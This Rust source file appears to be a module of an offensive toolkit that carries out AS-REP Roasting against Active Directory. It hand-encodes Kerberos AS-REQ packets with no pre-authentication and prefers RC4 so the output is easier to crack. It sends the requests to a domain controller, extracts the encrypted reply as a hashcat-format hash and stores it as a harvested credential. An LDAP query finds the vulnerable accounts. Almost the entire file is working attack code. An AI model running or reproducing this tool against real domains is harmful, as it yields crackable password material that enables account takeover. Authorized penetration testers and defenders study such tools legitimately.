//! AS-REP Roasting attack implementation
//!
//! Native implementation for extracting AS-REP hashes from users
//! with "Do not require Kerberos preauthentication" set.

use anyhow::{anyhow, Result};
use chrono::Utc;
use log::{debug, info, warn};
use std::collections::HashMap;
use std::net::UdpSocket;

use crate::credentials::types::*;

/// AS-REP Roasting attack engine
pub struct AsrepRoaster {
    /// Configuration
    config: AsrepConfig,
    /// Extracted hashes
    hashes: Vec<AsrepResult>,
}

/// AS-REP roasting configuration
#[derive(Debug, Clone)]
pub struct AsrepConfig {
    /// Domain controller / KDC
    pub kdc: String,
    /// Realm
    pub realm: String,
    /// Timeout in seconds
    pub timeout_secs: u64,
    /// Request encryption types (prefer weak for easier cracking)
    pub etypes: Vec<i32>,
}

impl Default for AsrepConfig {
    fn default() -> Self {
        Self {
            kdc: String::new(),
            realm: String::new(),
            timeout_secs: 10,
            etypes: vec![23, 18, 17, 3], // Prefer RC4 for cracking
        }
    }
}

/// Result from AS-REP roasting
#[derive(Debug, Clone)]
pub struct AsrepResult {
    /// User principal
    pub user: String,
    /// Realm
    pub realm: String,
    /// Encryption type
    pub etype: i32,
    /// The hash in hashcat format
    pub hash: String,
    /// Whether user requires preauth (false = roastable)
    pub roastable: bool,
    /// Error message if not roastable
    pub error: Option<String>,
    /// Timestamp
    pub timestamp: chrono::DateTime<Utc>,
}

impl AsrepResult {
    /// Get hashcat-compatible format
    pub fn to_hashcat(&self) -> String {
        format!("$krb5asrep${}${}@{}:{}",
            self.etype,
            self.user,
            self.realm,
            self.hash)
    }
}

impl AsrepRoaster {
    /// Create new AS-REP roaster
    pub fn new(config: AsrepConfig) -> Self {
        Self {
            config,
            hashes: Vec::new(),
        }
    }

    /// Check if a user is roastable (no preauth required)
    pub async fn check_user(&self, username: &str) -> AsrepResult {
        let realm = &self.config.realm;
        info!("Checking AS-REP for {}@{}", username, realm);

        // Build AS-REQ without pre-authentication
        let as_req = match self.build_as_req(username) {
            Ok(req) => req,
            Err(e) => {
                return AsrepResult {
                    user: username.to_string(),
                    realm: realm.to_string(),
                    etype: 0,
                    hash: String::new(),
                    roastable: false,
                    error: Some(format!("Failed to build AS-REQ: {}", e)),
                    timestamp: Utc::now(),
                };
            }
        };

        // Send to KDC
        let response = match self.send_to_kdc(&as_req) {
            Ok(resp) => resp,
            Err(e) => {
                return AsrepResult {
                    user: username.to_string(),
                    realm: realm.to_string(),
                    etype: 0,
                    hash: String::new(),
                    roastable: false,
                    error: Some(format!("KDC communication error: {}", e)),
                    timestamp: Utc::now(),
                };
            }
        };

        // Parse response
        self.parse_response(&response, username)
    }

    /// Roast multiple users
    pub async fn roast(&mut self, usernames: &[String]) -> Vec<AsrepResult> {
        let mut results = Vec::new();

        for username in usernames {
            let result = self.check_user(username).await;

            if result.roastable {
                info!("User {} is roastable! Got AS-REP hash", username);
                self.hashes.push(result.clone());
            } else {
                debug!("User {} requires preauth", username);
            }

            results.push(result);
        }

        let roastable_count = results.iter().filter(|r| r.roastable).count();
        info!("AS-REP roasting complete: {}/{} users roastable",
              roastable_count, usernames.len());

        results
    }

    /// Get all extracted hashes
    pub fn get_hashes(&self) -> &[AsrepResult] {
        &self.hashes
    }

    /// Get roastable users only
    pub fn get_roastable(&self) -> Vec<&AsrepResult> {
        self.hashes.iter().filter(|r| r.roastable).collect()
    }

    /// Convert results to stored credentials
    pub fn to_credentials(&self) -> Vec<StoredCredential> {
        self.hashes.iter()
            .filter(|h| h.roastable)
            .map(|h| {
                StoredCredential {
                    id: String::new(),
                    credential_type: CredentialType::NtlmHash,
                    identity: h.user.clone(),
                    domain: Some(h.realm.clone()),
                    secret: CredentialSecret::Hash {
                        hash_type: format!("kerberos_asrep_{}", h.etype),
                        value: h.to_hashcat(),
                    },
                    source: CredentialSource::AsrepRoasting {
                        user_principal: format!("{}@{}", h.user, h.realm),
                    },
                    health: CredentialHealth::default(),
                    targets: Vec::new(),
                    tags: vec!["asrep_roasting".to_string()],
                    metadata: {
                        let mut m = HashMap::new();
                        m.insert("etype".to_string(), h.etype.to_string());
                        m.insert("note".to_string(),
                            "User has 'Do not require Kerberos preauthentication' set".to_string());
                        m
                    },
                    discovered_at: h.timestamp,
                    last_verified_at: None,
                    expires_at: None,
                    last_used_at: None,
                }
            })
            .collect()
    }

    // Internal methods

    fn build_as_req(&self, username: &str) -> Result<Vec<u8>> {
        let realm = &self.config.realm;

        let mut req = Vec::new();

        // Application tag 10 (AS-REQ)
        req.push(0x6a);
        let outer_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // Sequence
        req.push(0x30);
        let seq_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // pvno [1] INTEGER (5)
        req.extend_from_slice(&[0xa1, 0x03, 0x02, 0x01, 0x05]);

        // msg-type [2] INTEGER (10 = AS-REQ)
        req.extend_from_slice(&[0xa2, 0x03, 0x02, 0x01, 0x0a]);

        // No padata - this is the key for AS-REP roasting

        // req-body [4] KDC-REQ-BODY
        req.push(0xa4);
        let body_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        req.push(0x30);
        let inner_len_pos = req.len();
        req.push(0x82);
        req.extend_from_slice(&[0x00, 0x00]);

        // kdc-options [0] KDCOptions
        req.extend_from_slice(&[0xa0, 0x07, 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10]);

        // cname [1] PrincipalName
        self.encode_principal_name(&mut req, 0xa1, 1, &[username])?;

        // realm [2] Realm
        req.push(0xa2);
        if realm.len() < 0x80 {
            req.push((realm.len() + 2) as u8);
            req.push(0x1b);
            req.push(realm.len() as u8);
        } else {
            req.push(0x82);
            let total_len = realm.len() + 4;
            req.push(((total_len >> 8) & 0xff) as u8);
            req.push((total_len & 0xff) as u8);
            req.push(0x1b);
            req.push(0x82);
            req.push(((realm.len() >> 8) & 0xff) as u8);
            req.push((realm.len() & 0xff) as u8);
        }
        req.extend_from_slice(realm.as_bytes());

        // sname [3] PrincipalName (krbtgt/REALM)
        self.encode_principal_name(&mut req, 0xa3, 2, &["krbtgt", realm])?;

        // till [5] KerberosTime - 30 days from now
        let till = Utc::now() + chrono::Duration::days(30);
        let till_str = till.format("%Y%m%d%H%M%SZ").to_string();
        req.push(0xa5);
        req.push((till_str.len() + 2) as u8);
        req.push(0x18); // GeneralizedTime
        req.push(till_str.len() as u8);
        req.extend_from_slice(till_str.as_bytes());

        // nonce [7] UInt32
        let nonce: u32 = rand::random();
        req.extend_from_slice(&[0xa7, 0x06, 0x02, 0x04]);
        req.extend_from_slice(&nonce.to_be_bytes());

        // etype [8] SEQUENCE OF Int32
        req.push(0xa8);
        let etype_len = self.config.etypes.len() * 3;
        if etype_len < 0x80 {
            req.push((etype_len + 2) as u8);
            req.push(0x30);
            req.push(etype_len as u8);
        } else {
            req.push(0x82);
            let total = etype_len + 4;
            req.push(((total >> 8) & 0xff) as u8);
            req.push((total & 0xff) as u8);
            req.push(0x30);
            req.push(0x82);
            req.push(((etype_len >> 8) & 0xff) as u8);
            req.push((etype_len & 0xff) as u8);
        }
        for etype in &self.config.etypes {
            req.extend_from_slice(&[0x02, 0x01, *etype as u8]);
        }

        // Fix lengths
        let inner_len = req.len() - inner_len_pos - 3;
        req[inner_len_pos] = ((inner_len >> 8) & 0xff) as u8;
        req[inner_len_pos + 1] = (inner_len & 0xff) as u8;

        let body_len = req.len() - body_len_pos - 3;
        req[body_len_pos] = ((body_len >> 8) & 0xff) as u8;
        req[body_len_pos + 1] = (body_len & 0xff) as u8;

        let seq_len = req.len() - seq_len_pos - 3;
        req[seq_len_pos] = ((seq_len >> 8) & 0xff) as u8;
        req[seq_len_pos + 1] = (seq_len & 0xff) as u8;

        let outer_len = req.len() - outer_len_pos - 3;
        req[outer_len_pos] = ((outer_len >> 8) & 0xff) as u8;
        req[outer_len_pos + 1] = (outer_len & 0xff) as u8;

        Ok(req)
    }

    fn encode_principal_name(&self, buf: &mut Vec<u8>, tag: u8, name_type: u8, parts: &[&str]) -> Result<()> {
        // Calculate total size
        let mut parts_len = 0;
        for part in parts {
            parts_len += 2 + part.len(); // tag + len + data
        }

        buf.push(tag);
        let tag_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        buf.push(0x30);
        let seq_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        // name-type [0] INTEGER
        buf.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, name_type]);

        // name-string [1] SEQUENCE OF GeneralString
        buf.push(0xa1);
        let names_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        buf.push(0x30);
        let names_seq_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        for part in parts {
            buf.push(0x1b); // GeneralString
            if part.len() < 0x80 {
                buf.push(part.len() as u8);
            } else {
                buf.push(0x82);
                buf.push(((part.len() >> 8) & 0xff) as u8);
                buf.push((part.len() & 0xff) as u8);
            }
            buf.extend_from_slice(part.as_bytes());
        }

        let names_seq_len = buf.len() - names_seq_len_pos - 3;
        buf[names_seq_len_pos] = ((names_seq_len >> 8) & 0xff) as u8;
        buf[names_seq_len_pos + 1] = (names_seq_len & 0xff) as u8;

        let names_len = buf.len() - names_len_pos - 3;
        buf[names_len_pos] = ((names_len >> 8) & 0xff) as u8;
        buf[names_len_pos + 1] = (names_len & 0xff) as u8;

        let seq_len = buf.len() - seq_len_pos - 3;
        buf[seq_len_pos] = ((seq_len >> 8) & 0xff) as u8;
        buf[seq_len_pos + 1] = (seq_len & 0xff) as u8;

        let tag_len = buf.len() - tag_len_pos - 3;
        buf[tag_len_pos] = ((tag_len >> 8) & 0xff) as u8;
        buf[tag_len_pos + 1] = (tag_len & 0xff) as u8;

        Ok(())
    }

    fn send_to_kdc(&self, request: &[u8]) -> Result<Vec<u8>> {
        let addr = if self.config.kdc.contains(':') {
            self.config.kdc.clone()
        } else {
            format!("{}:88", self.config.kdc)
        };

        let socket = UdpSocket::bind("0.0.0.0:0")?;
        socket.set_read_timeout(Some(std::time::Duration::from_secs(self.config.timeout_secs)))?;
        socket.connect(&addr)?;
        socket.send(request)?;

        let mut buf = [0u8; 65535];
        let len = socket.recv(&mut buf)?;

        Ok(buf[..len].to_vec())
    }

    fn parse_response(&self, data: &[u8], username: &str) -> AsrepResult {
        let realm = &self.config.realm;

        if data.is_empty() {
            return AsrepResult {
                user: username.to_string(),
                realm: realm.to_string(),
                etype: 0,
                hash: String::new(),
                roastable: false,
                error: Some("Empty response from KDC".to_string()),
                timestamp: Utc::now(),
            };
        }

        // Check for KRB-ERROR (0x7e)
        if data[0] == 0x7e {
            let error_code = self.extract_error_code(data);

            let (roastable, error_msg) = match error_code {
                Some(6) => (false, Some("KDC_ERR_C_PRINCIPAL_UNKNOWN - User does not exist".to_string())),
                Some(18) => (false, Some("KDC_ERR_PREAUTH_REQUIRED - User requires preauthentication".to_string())),
                Some(24) => (false, Some("KDC_ERR_PREAUTH_FAILED".to_string())),
                Some(code) => (false, Some(format!("Kerberos error: {}", code))),
                None => (false, Some("Unknown Kerberos error".to_string())),
            };

            return AsrepResult {
                user: username.to_string(),
                realm: realm.to_string(),
                etype: 0,
                hash: String::new(),
                roastable,
                error: error_msg,
                timestamp: Utc::now(),
            };
        }

        // Check for AS-REP (0x6b = Application 11)
        if data[0] == 0x6b {
            // Got AS-REP without preauth - user is roastable!
            match self.extract_enc_part(data) {
                Ok((etype, cipher)) => {
                    let hash = self.format_hash_data(&cipher);

                    return AsrepResult {
                        user: username.to_string(),
                        realm: realm.to_string(),
                        etype,
                        hash,
                        roastable: true,
                        error: None,
                        timestamp: Utc::now(),
                    };
                }
                Err(e) => {
                    return AsrepResult {
                        user: username.to_string(),
                        realm: realm.to_string(),
                        etype: 0,
                        hash: String::new(),
                        roastable: false,
                        error: Some(format!("Failed to extract hash: {}", e)),
                        timestamp: Utc::now(),
                    };
                }
            }
        }

        AsrepResult {
            user: username.to_string(),
            realm: realm.to_string(),
            etype: 0,
            hash: String::new(),
            roastable: false,
            error: Some(format!("Unexpected response type: {:#x}", data[0])),
            timestamp: Utc::now(),
        }
    }

    fn extract_error_code(&self, data: &[u8]) -> Option<i32> {
        // Find error-code [6] in KRB-ERROR
        let mut i = 0;
        while i < data.len().saturating_sub(4) {
            if data[i] == 0xa6 { // error-code tag
                if data[i + 1] == 0x03 && data[i + 2] == 0x02 && data[i + 3] == 0x01 {
                    return Some(data[i + 4] as i32);
                }
            }
            i += 1;
        }
        None
    }

    fn extract_enc_part(&self, data: &[u8]) -> Result<(i32, Vec<u8>)> {
        // Find enc-part in AS-REP
        // enc-part [6] EncryptedData

        let mut i = 0;
        while i < data.len().saturating_sub(20) {
            if data[i] == 0xa6 { // enc-part tag [6]
                let (_len, offset) = self.parse_asn1_length(&data[i + 1..])?;
                let enc_start = i + 1 + offset;

                // Parse EncryptedData
                // etype [0] INTEGER
                // kvno [1] INTEGER (optional)
                // cipher [2] OCTET STRING

                let etype = self.find_integer(&data[enc_start..], 0xa0)
                    .unwrap_or(23);

                let cipher = self.find_octet_string(&data[enc_start..], 0xa2)?;

                return Ok((etype, cipher));
            }
            i += 1;
        }

        Err(anyhow!("enc-part not found in AS-REP"))
    }

    fn find_integer(&self, data: &[u8], tag: u8) -> Option<i32> {
        let mut i = 0;
        while i < data.len().saturating_sub(5) {
            if data[i] == tag {
                if data[i + 1] == 0x03 && data[i + 2] == 0x02 && data[i + 3] == 0x01 {
                    return Some(data[i + 4] as i32);
                }
            }
            i += 1;
        }
        None
    }

    fn find_octet_string(&self, data: &[u8], tag: u8) -> Result<Vec<u8>> {
        let mut i = 0;
        while i < data.len().saturating_sub(6) {
            if data[i] == tag {
                let (_len, offset) = self.parse_asn1_length(&data[i + 1..])?;
                let start = i + 1 + offset;

                // Should be OCTET STRING (0x04)
                if start < data.len() && data[start] == 0x04 {
                    let (inner_len, inner_offset) = self.parse_asn1_length(&data[start + 1..])?;
                    let data_start = start + 1 + inner_offset;
                    let data_end = data_start + inner_len;

                    if data_end <= data.len() {
                        return Ok(data[data_start..data_end].to_vec());
                    }
                }
            }
            i += 1;
        }

        Err(anyhow!("OCTET STRING not found"))
    }

    fn parse_asn1_length(&self, data: &[u8]) -> Result<(usize, usize)> {
        if data.is_empty() {
            return Err(anyhow!("Empty data for length"));
        }

        if data[0] < 0x80 {
            Ok((data[0] as usize, 1))
        } else if data[0] == 0x81 {
            if data.len() < 2 {
                return Err(anyhow!("Truncated length"));
            }
            Ok((data[1] as usize, 2))
        } else if data[0] == 0x82 {
            if data.len() < 3 {
                return Err(anyhow!("Truncated length"));
            }
            Ok((((data[1] as usize) << 8) | (data[2] as usize), 3))
        } else {
            Err(anyhow!("Unsupported length encoding: {:#x}", data[0]))
        }
    }

    fn format_hash_data(&self, cipher: &[u8]) -> String {
        // Format: checksum$encrypted_data
        // For RC4-HMAC, first 16 bytes are checksum

        if cipher.len() < 24 {
            return hex::encode(cipher);
        }

        // Hashcat format for AS-REP:
        // $krb5asrep$23$user@REALM:checksum$encrypted

        let checksum = &cipher[..16];
        let encrypted = &cipher[16..];

        format!("{}${}", hex::encode(checksum), hex::encode(encrypted))
    }
}

/// Enumerate users vulnerable to AS-REP roasting from LDAP
pub async fn enumerate_asrep_users(
    ldap_host: &str,
    bind_user: &str,
    bind_password: &str,
    base_dn: &str,
) -> Result<Vec<String>> {
    use ldap3::{LdapConnAsync, Scope, SearchEntry};

    let (conn, mut ldap) = LdapConnAsync::new(&format!("ldap://{}", ldap_host)).await?;
    ldap3::drive!(conn);

    ldap.simple_bind(bind_user, bind_password).await?.success()?;

    // Search for users with DONT_REQ_PREAUTH flag
    // userAccountControl & 0x400000 (4194304) = DONT_REQ_PREAUTH
    let filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";

    let (entries, _res) = ldap.search(
        base_dn,
        Scope::Subtree,
        filter,
        vec!["sAMAccountName"],
    ).await?.success()?;

    let users: Vec<String> = entries.into_iter()
        .filter_map(|entry| {
            let se = SearchEntry::construct(entry);
            se.attrs.get("sAMAccountName")
                .and_then(|v| v.first().cloned())
        })
        .collect();

    ldap.unbind().await?;

    Ok(users)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_asrep_result_format() {
        let result = AsrepResult {
            user: "testuser".to_string(),
            realm: "DOMAIN.COM".to_string(),
            etype: 23,
            hash: "abcd1234$efgh5678".to_string(),
            roastable: true,
            error: None,
            timestamp: Utc::now(),
        };

        let hashcat = result.to_hashcat();
        assert_eq!(hashcat, "$krb5asrep$23$testuser@DOMAIN.COM:abcd1234$efgh5678");
    }
}
